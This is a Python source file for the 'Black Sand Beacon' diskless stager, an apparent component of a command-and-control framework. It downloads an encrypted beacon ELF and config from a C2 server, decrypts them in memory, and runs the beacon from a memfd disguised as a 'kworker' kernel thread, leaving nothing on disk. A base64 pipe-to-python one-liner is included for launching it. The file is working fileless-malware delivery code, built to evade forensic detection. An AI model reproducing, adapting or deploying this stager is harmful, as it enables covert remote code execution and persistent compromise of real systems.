#!/usr/bin/env python3
"""Black Sand Beacon diskless stager.

Fetches encrypted beacon ELF and config.json from C2 staging endpoints,
decrypts them in RAM, and executes the beacon from an anonymous memfd.
Nothing is ever written to disk.

Payloads are protected with AES-256-CFB + HMAC-SHA256 using keys derived
from the staging token via HKDF-SHA256 (salt "blacksandbeacon-stage-v2"),
matching c2/server.py. Token is sent in Authorization header (not URL).

Environment:
    BSB_STAGE_URL          base C2 URL (e.g. https://c2.example:7070)
    BSB_STAGE_TOKEN        staging token (same as server.stage_token)
    BSB_STAGE_ARGV0        argv[0] for the beacon (default "kworker/u8:2")
    BSB_STAGE_INSECURE_TLS set to 1 to skip TLS verification (lab only)

Usage:
    python3 stage_payload.py
    echo <b64> | base64 -d | BSB_STAGE_URL=... BSB_STAGE_TOKEN=... python3 -
"""

import base64
import hashlib
import hmac
import json
import os
import ssl
import sys
import urllib.error
import urllib.request

from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

HKDF_SALT = b"blacksandbeacon-stage-v2"
HKDF_INFO_ENC = b"stage-enc"
HKDF_INFO_HMAC = b"stage-hmac"


def hkdf_sha256(ikm, salt, info, length=32):
    """RFC 5869 HKDF extract+expand (mirrors c2/server.py)."""
    prk = hmac.new(salt, ikm, hashlib.sha256).digest()
    out, t, counter = b"", b"", 1
    while len(out) < length:
        t = hmac.new(prk, t + info + bytes([counter]), hashlib.sha256).digest()
        out += t
        counter += 1
    return out[:length]


def _fetch_and_decode(url, token, path, tls_ctx):
    req = urllib.request.Request(
        url + path,
        headers={"Authorization": f"Bearer {token}"},
    )
    try:
        rq = urllib.request.urlopen(req, context=tls_ctx)
    except urllib.error.HTTPError as e:
        if e.code in (403, 404):
            sys.exit(
                f"stage: HTTP {e.code} from {path} — staging disabled or token "
                "mismatch. Check BSB_STAGE_TOKEN vs server.stage_token in the "
                "C2 config.json (the one-liner must come from the running server)."
            )
        raise
    raw = base64.b64decode(rq.read().strip())
    if len(raw) < 16 + 32:
        sys.exit("stage: response too short")
    tag = raw[-32:]
    body = raw[:-32]
    ikm = token.encode("utf-8")
    enc_key = hkdf_sha256(ikm, HKDF_SALT, HKDF_INFO_ENC)
    mac_key = hkdf_sha256(ikm, HKDF_SALT, HKDF_INFO_HMAC)
    expected = hmac.new(mac_key, body, hashlib.sha256).digest()
    if not hmac.compare_digest(tag, expected):
        sys.exit("stage: authentication failed (bad token or tampered payload)")
    iv, ciphertext = body[:16], body[16:]
    cipher = Cipher(algorithms.AES(enc_key), modes.CFB(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    return decryptor.update(ciphertext) + decryptor.finalize()


def main():
    url = os.environ["BSB_STAGE_URL"].rstrip("/")
    token = os.environ["BSB_STAGE_TOKEN"]
    argv0 = os.environ.get("BSB_STAGE_ARGV0", "kworker/u8:2")
    tls_ctx = (
        ssl._create_unverified_context()
        if os.environ.get("BSB_STAGE_INSECURE_TLS")
        else None
    )

    elf = _fetch_and_decode(url, token, "/stage/beacon", tls_ctx)
    assert elf[:4] == b"\x7fELF", "stage: decoded payload is not an ELF"
    conf = _fetch_and_decode(url, token, "/stage/config", tls_ctx)
    json.loads(conf.decode())  # sanity: must be valid JSON

    # MFD_CLOEXEC not set on the config fd: it must survive execve so the
    # beacon can open /proc/self/fd/<cf> as its config source. No disk.
    beacon_fd = os.memfd_create("", 0)
    os.write(beacon_fd, elf)
    config_fd = os.memfd_create("", 0)
    os.write(config_fd, conf)

    os.execve(
        "/proc/self/fd/%d" % beacon_fd,
        [argv0],
        dict(os.environ, BSB_CONFIG="/proc/self/fd/%d" % config_fd),
    )


if __name__ == "__main__":
    main()
